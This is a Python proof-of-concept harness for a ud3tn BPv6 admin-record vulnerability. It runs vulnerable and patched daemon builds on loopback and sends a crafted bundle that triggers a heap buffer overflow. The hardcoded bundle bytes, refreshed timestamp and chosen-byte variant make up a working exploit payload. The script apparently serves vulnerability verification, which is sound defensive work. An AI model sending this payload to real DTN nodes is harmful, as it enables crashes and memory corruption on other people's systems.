#!/usr/bin/env python3
"""Loopback-only trigger for the published CVE-2026-121510 BPv6 admin-record PoC.

Starts a pinned ud3tn daemon, sends one CBOR-framed MTCP bundle to 127.0.0.1,
captures the daemon log, and tears the daemon down. No off-loopback traffic.
"""
import argparse
import os
import pathlib
import socket
import subprocess
import time

# Prefix of the bundle published in https://gitlab.com/d3tn/ud3tn/-/work_items/289
# through the admin record's six-byte header: primary block, destination
# dtn://ud3tn.dtn/app, payload block header 01 08 46 (0x46 = 70 payload bytes),
# admin record 10 00 00 00 00 00 (the 6th byte is the source-EID length SDNV).
PREFIX_HEX = (
    "06 81 12 4e 00 04 14 18 2b 2f 34 38 83 92 98 b1 4c 00 82 2c 3d "
    "64 74 6e 00 2f 2f 75 64 33 74 6e 2e 64 74 6e 2f 61 70 70 00 64 "
    "74 6e 00 2f 2f 61 74 74 61 63 6b 65 72 2e 64 74 6e 2f 61 70 70 "
    "00 64 74 6e 00 6e 6f 6e 65 00 64 74 6e 00 6e 6f 6e 65 00 01 08 "
    "46 10 00 00 00 00 00"
)


def sdnv_encode(value):
    # SDNV is big-endian base-128: continuation bit on every byte but the last.
    groups = [value & 0x7F]
    value >>= 7
    while value:
        groups.append(value & 0x7F)
        value >>= 7
    groups.reverse()
    return bytes([g | 0x80 for g in groups[:-1]] + [groups[-1]])

def cbor_byte_string_header(n):
    if n < 24:
        return bytes([0x40 | n])
    if n < 256:
        return bytes([0x58, n])
    if n < 65536:
        return bytes([0x59, n >> 8, n & 0xFF])
    raise ValueError(n)


def make_bundle(marker=0x41, count=64, eid_len=0x00):
    prefix = bytearray.fromhex(PREFIX_HEX)
    assert len(prefix) == 91, len(prefix)
    # Admin record 10 00 00 00 00 00 occupies prefix[85..90]; [90] is the
    # source-EID-length SDNV (0x00 triggers the uint16_t underflow).
    prefix[90] = eid_len
    # Published PoC's creation timestamp is stale; the BPA drops the bundle
    # before admin-record dispatch. Offsets 12..16 are the 5-byte SDNV
    # creation timestamp; replace it without changing any length field.
    ts = sdnv_encode(int(time.time()))
    assert len(ts) == 5, ts.hex()
    prefix[12:17] = ts
    bundle = bytes(prefix) + bytes([marker]) * count
    assert len(bundle) == 91 + count
    return cbor_byte_string_header(len(bundle)) + bundle


def run_case(label, binary, port, marker, count, eid_len, outdir, timeout=8):
    outdir.mkdir(parents=True, exist_ok=True)
    logpath = outdir / (label + ".log")
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1:symbolize=1"
    cmd = [
        str(binary), "-b", "6",
        "-e", "dtn://ud3tn.dtn/",
        "-c", f"mtcp:127.0.0.1,{port}",
        "-s", str(outdir / (label + ".aap.sock")),
        "-S", str(outdir / (label + ".aap2.sock")),
        "-L", "4",
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            env=env, text=True)
    wire = make_bundle(marker, count, eid_len)
    try:
        deadline = time.time() + 5
        while True:
            if proc.poll() is not None:
                break
            try:
                sock = socket.create_connection(("127.0.0.1", port), timeout=1)
                break
            except OSError:
                if time.time() > deadline:
                    raise RuntimeError("daemon port never opened")
                time.sleep(0.1)
        else:
            raise RuntimeError("daemon exited before listen")
        with sock:
            sock.settimeout(2)
            sock.sendall(wire)
            try:
                sock.recv(4096)
            except OSError:
                pass
        time.sleep(1.0)
    finally:
        if proc.poll() is None:
            proc.terminate()
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _ = proc.communicate()
    logpath.write_text(out)
    hit = ("AddressSanitizer" in out) or ("heap-buffer-overflow" in out)
    summary = [ln for ln in out.splitlines()
               if "AddressSanitizer" in ln or "heap-buffer-overflow" in ln
               or "SUMMARY:" in ln or "WRITE of size" in ln
               or "REPORT" in ln or "admin" in ln.lower()]
    print(f"{label}: rc={proc.returncode} asan={hit} wire={len(wire)}B log={logpath}")
    for ln in summary[:12]:
        print("   ", ln)
    return hit


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", required=True, help="pinned source tree root")
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--vuln-port", type=int, default=15224)
    ap.add_argument("--fixed-port", type=int, default=15230)
    args = ap.parse_args()
    outdir = pathlib.Path(args.outdir)
    vuln = pathlib.Path(args.src) / "ud3tn-v0.15.1/build/posix/ud3tn"
    fixed = pathlib.Path(args.src) / "ud3tn-v0.15.2/build/posix/ud3tn"
    for p in (vuln, fixed):
        assert p.is_file(), p
    res = {}
    res["vuln-trigger-41"] = run_case(
        "vuln-trigger-41", vuln, args.vuln_port, 0x41, 64, 0, outdir)
    res["vuln-chosen-5a"] = run_case(
        "vuln-chosen-5a", vuln, args.vuln_port + 1, 0x5A, 64, 0, outdir)
    res["vuln-safe-eid8"] = run_case(
        "vuln-safe-eid8", vuln, args.vuln_port + 2, 0x41, 64, 8, outdir)
    res["fixed-trigger-41"] = run_case(
        "fixed-trigger-41", fixed, args.fixed_port, 0x41, 64, 0, outdir)
    (outdir / "results.txt").write_text(
        "\n".join(f"{k} asan={v}" for k, v in res.items()) + "\n")
    print("RESULTS", res)


if __name__ == "__main__":
    main()
